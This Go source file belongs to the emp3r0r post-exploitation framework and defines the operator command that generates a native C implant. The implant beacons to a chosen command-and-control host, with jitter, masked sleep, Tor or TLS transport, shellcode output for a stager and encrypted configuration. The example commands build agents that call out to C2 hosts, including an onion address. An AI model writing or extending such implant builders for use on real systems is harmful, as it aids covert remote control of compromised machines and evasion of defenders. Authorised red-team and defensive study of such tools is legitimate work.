package operator

import (
	"fmt"
	"strings"

	"github.com/carapace-sh/carapace"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/builder"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// gen_c_cmd is the C agent's own generator. It is separate from
// `generate` because the C agent has a different target model: --type selects
// the libc ABI and --arch selects a C toolchain target, not a Go payload type.
func gen_c_cmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:     "generate_c",
		GroupID: "agent",
		Short:   "Generate the native C agent",
		Example: "generate_c --type glibc --arch amd64 --cc your.domain.com",
		Long: `Generate the native C agent.

The default http_poll transport dials the plain HTTP listener on --cc-http-port
when --cc is a bare hostname. With an explicit https:// URL it uses TLS through the C2 TLS
frontend or an external TLS front proxy. TLS requires --transport libcurl
(default) or --transport libssl; http_raw is plain HTTP only. If the C2
certificate does not cover the new name, the server adds it there and reloads
the certificate for new TLS/QUIC handshakes.

A custom transport uses --c2-channel-mode <name> --allow-custom-transport
--transport <name>. The provider must exist as
core/c_agent/src/transport/transport_<name>.c. Tor is shipped as the reference:
--transport tor with --transport-option socks5=127.0.0.1:9050.

The shellcode format is marked stager-run so stager_linux can bind its sleep
mask; other formats stay standalone.

Examples:
  generate_c --cc c2.example.com --type glibc --arch amd64
  generate_c --cc https://front.example.com --type glibc --arch amd64 --transport libssl
  generate_c --cc https://c2.example.com:8443 --type glibc --arch amd64 --transport libcurl
  generate_c --cc c2.example.com --interval 60 --jitter 50
  generate_c --cc abcdef.onion:80 --c2-channel-mode tor --allow-custom-transport \
    --transport tor --transport-option socks5=127.0.0.1:9050`,
		Run: CmdGenerateCAgent,
	}

	cmd.Flags().StringP("type", "t", builder.CAgentLibcs[0], fmt.Sprintf("C library variant, available: %v", builder.CAgentLibcs))
	cmd.Flags().StringP("arch", "a", builder.CAgentArches[0], fmt.Sprintf("Target architecture, available: %v", builder.CAgentArches))
	cmd.Flags().String("cc", defaultC2Address(), "C2 hostname, or an explicit http(s) URL for TLS (Required)")
	cmd.Flags().String("cc-http-port", live.RuntimeConfig.CCHTTPPort, "Port for HTTP Polling/Beaconing C2 transport")
	cmd.Flags().String("doh", "", "DNS over HTTPS resolver URL. Example: https://1.1.1.1/dns-query")
	cmd.Flags().String("c2-channel-mode", def.C2ChannelModeDefault, "Agent C2 channel mode; use the provider name for a custom transport")
	cmd.Flags().Bool("allow-custom-transport", false, "Allow --c2-channel-mode and --transport to name a custom C transport provider")
	cmd.Flags().StringSlice("transport-option", nil, "Custom transport option as key=value (repeatable)")

	cmd.Flags().String("crypto", builder.CAgentCryptoProviders[0], fmt.Sprintf("Crypto provider. Available: %v", builder.CAgentCryptoProviders))
	cmd.Flags().String("format", builder.CAgentFormats[0], fmt.Sprintf("Output format. Available: %v", builder.CAgentFormats))
	cmd.Flags().String("gzip", builder.CAgentGzipProviders[0], fmt.Sprintf("Compression provider. Available: %v", builder.CAgentGzipProviders))
	cmd.Flags().String("transport", builder.CAgentTransportProviders[0], fmt.Sprintf("Transport provider. Available: %v", builder.CAgentTransportProviders))
	cmd.Flags().String("dynload", builder.CAgentDynloadModes[0], fmt.Sprintf("libc dynamic-loader symbols. Available: %v", builder.CAgentDynloadModes))
	cmd.Flags().String("glibc-version", builder.CAgentGlibcVersions[0], fmt.Sprintf("Oldest glibc ABI to link against. Available: %v", builder.CAgentGlibcVersions))
	cmd.Flags().String("bof", "1", "Include COFF/BOF support (1) or compile it out (0)")
	cmd.Flags().Int("interval", 60, "C2 beacon interval in seconds")
	cmd.Flags().Int("jitter", 50, "Beacon jitter percentage (0-100); sleeps in [interval*(1-jitter%), interval]")
	cmd.Flags().Int("poll-window", 5, "Seconds to wait for commands after hello before entering masked sleep")
	cmd.Flags().Int("offline-grace", 0, "Seconds a sleeping agent stays listed before removal (0 derives from interval and poll window)")

	cmd.MarkFlagRequired("cc")

	carapace.Gen(cmd).FlagCompletion(carapace.ActionMap{
		"type":            carapace.ActionValues(builder.CAgentLibcs...),
		"arch":            carapace.ActionValues(builder.CAgentArches...),
		"cc":              carapace.ActionValues(c2AddressCompletions()...),
		"cc-http-port":    carapace.ActionValues(c2PortCompletions()...),
		"doh":             carapace.ActionValues("https://1.1.1.1/dns-query", "https://8.8.8.8/dns-query", "https://9.9.9.9/dns-query"),
		"c2-channel-mode": carapace.ActionValues(def.C2ChannelModePlainHTTP),
		"crypto":          carapace.ActionValues(builder.CAgentCryptoProviders...),
		"format":          carapace.ActionValues(builder.CAgentFormats...),
		"gzip":            carapace.ActionValues(builder.CAgentGzipProviders...),
		"transport":       carapace.ActionValues(builder.CAgentTransportProviders...),
		"dynload":         carapace.ActionValues(builder.CAgentDynloadModes...),
		"glibc-version":   carapace.ActionValues(builder.CAgentGlibcVersions...),
		"bof":             carapace.ActionValues("1", "0"),
		"interval":        carapace.ActionValues("30", "60", "120", "300"),
		"jitter":          carapace.ActionValues("0", "20", "50"),
		"poll-window":     carapace.ActionValues("1", "5", "10", "30"),
		"offline-grace":   carapace.ActionValues("0", "120", "300", "600"),
	})
	return cmd
}

// CmdGenerateCAgent builds the native C agent. --type is the libc variant and
// --arch is the C toolchain target, so these flags cannot collide with the Go
// agent generator's payload type and Go architecture.
func CmdGenerateCAgent(cmd *cobra.Command, _ []string) {
	libc := flagString(cmd, "type")
	dynload := cAgentDynloadForLibc(libc, flagString(cmd, "dynload"), cmd.Flags().Changed("dynload"))
	channelMode := flagString(cmd, "c2-channel-mode")
	if channelMode == "" {
		channelMode = def.C2ChannelModeDefault
	}
	allowCustom, _ := cmd.Flags().GetBool("allow-custom-transport")
	transportOptions, err := parseTransportOptions(cmd)
	if err != nil {
		logging.Errorf("Invalid transport option: %v", err)
		return
	}
	provider := flagString(cmd, "transport")
	customTransport := !def.IsBuiltinC2ChannelMode(channelMode)
	if customTransport {
		if !allowCustom {
			logging.Errorf("Invalid c2-channel-mode %q: add --allow-custom-transport", channelMode)
			return
		}
		if !cmd.Flags().Changed("transport") {
			provider = channelMode
		} else if provider != channelMode {
			logging.Errorf("Custom channel mode %q requires --transport %q", channelMode, channelMode)
			return
		}
	} else if provider != "libcurl" && provider != "http_raw" && provider != "libssl" {
		logging.Errorf("Transport %q is a custom provider: select --c2-channel-mode %q", provider, provider)
		return
	}
	interval, _ := cmd.Flags().GetInt("interval")
	jitter, _ := cmd.Flags().GetInt("jitter")
	pollWindow, _ := cmd.Flags().GetInt("poll-window")
	offlineGrace, _ := cmd.Flags().GetInt("offline-grace")
	if pollWindow < 1 {
		logging.Errorf("Invalid poll window: must be >= 1 second")
		return
	}
	if offlineGrace < 0 {
		logging.Errorf("Invalid offline grace: must be >= 0 seconds")
		return
	}
	if err := validateCAgentPollTiming(interval, jitter); err != nil {
		logging.Errorf("Invalid beacon timing: %v", err)
		return
	}
	providers := builder.CAgentProviders{
		Crypto:               flagString(cmd, "crypto"),
		Gzip:                 flagString(cmd, "gzip"),
		Transport:            provider,
		Dynload:              dynload,
		Glibc:                flagString(cmd, "glibc-version"),
		Libc:                 libc,
		Arch:                 flagString(cmd, "arch"),
		Format:               flagString(cmd, "format"),
		Bof:                  flagString(cmd, "bof"),
		AllowCustomTransport: allowCustom,
	}
	opts := builder.AgentConfig{
		CCAddress:            getStringOptPtr(cmd, "cc"),
		CCHTTPPort:           getStringOptPtr(cmd, "cc-http-port"),
		DoHServer:            getStringOptPtr(cmd, "doh"),
		C2ChannelMode:        &channelMode,
		AllowCustomTransport: allowCustom,
		TransportOptions:     transportOptions,
		PollInterval:         &interval,
		PollWindow:           &pollWindow,
		OfflineGrace:         &offlineGrace,
		Jitter:               &jitter,
		// shellcode is the artifact stager_linux embeds for a local payload.
		// Mark it so the agent binds the stager mask and identity FDs.
		IsStager: cAgentStagerMode(providers.Format),
	}

	res, err := builder.GenerateCAgentWorkflow(opts, providers, client.SignAgent)
	if err != nil {
		logging.Errorf("Failed to generate C agent: %v", err)
		return
	}

	logging.Successf("Generated C agent: %s (%d bytes)", res.OutputFile, util.FileSize(res.OutputFile))
	logging.Infof("C agent UUID: %s", util.AgentRef(res.AgentUUID))
	logging.Infof("Config payload: %d bytes, encrypted with the C2 MagicString", res.ConfigSize)
	endpoint := cAgentEndpoint(live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCHTTPPort, channelMode)
	logging.Infof("C agent transport: channel=%s transport=%s endpoint=%s",
		channelMode, providers.Transport, endpoint)
	if strings.HasPrefix(endpoint, "https://") && providers.Transport == "http_raw" {
		logging.Warningf("http_raw does not support TLS; use --transport libcurl or --transport libssl")
	}
}

// validateCAgentPollTiming rejects a beacon profile that would make the sleep
// cycle non-random or nonsensical.
func validateCAgentPollTiming(interval, jitter int) error {
	if interval <= 0 {
		return fmt.Errorf("interval must be greater than zero")
	}
	if jitter < 0 || jitter > 100 {
		return fmt.Errorf("jitter must be between 0 and 100")
	}
	return nil
}

// cAgentStagerMode reports whether the selected artifact is the one embedded
// by stager_linux. A standalone shellcode deployment simply finds no mask and
// falls back to a normal sleep.
func cAgentStagerMode(format string) bool {
	return format == "shellcode"
}

func flagString(cmd *cobra.Command, name string) string {
	v, _ := cmd.Flags().GetString(name)
	return v
}

// cAgentDynloadForLibc follows the selected libc when the operator did not pick
// a dynload mode. The --dynload default targets glibc, but musl only exports
// the public dl* names, so an unset mode becomes public for a musl build rather
// than failing validation on the glibc default.
func cAgentDynloadForLibc(libc, dynload string, dynloadSet bool) string {
	if libc == "musl" && !dynloadSet {
		return "public"
	}
	return dynload
}

// cAgentEndpoint describes the URL baked into the C agent. An explicit URL
// carries its own scheme and port; a bare host uses the plain HTTP port.
func cAgentEndpoint(cc, httpPort, channelMode string) string {
	cc = strings.TrimSuffix(cc, "/")
	if !def.IsBuiltinC2ChannelMode(channelMode) {
		return cc
	}
	if strings.Contains(cc, "://") {
		return cc
	}
	return fmt.Sprintf("http://%s:%s", cc, httpPort)
}
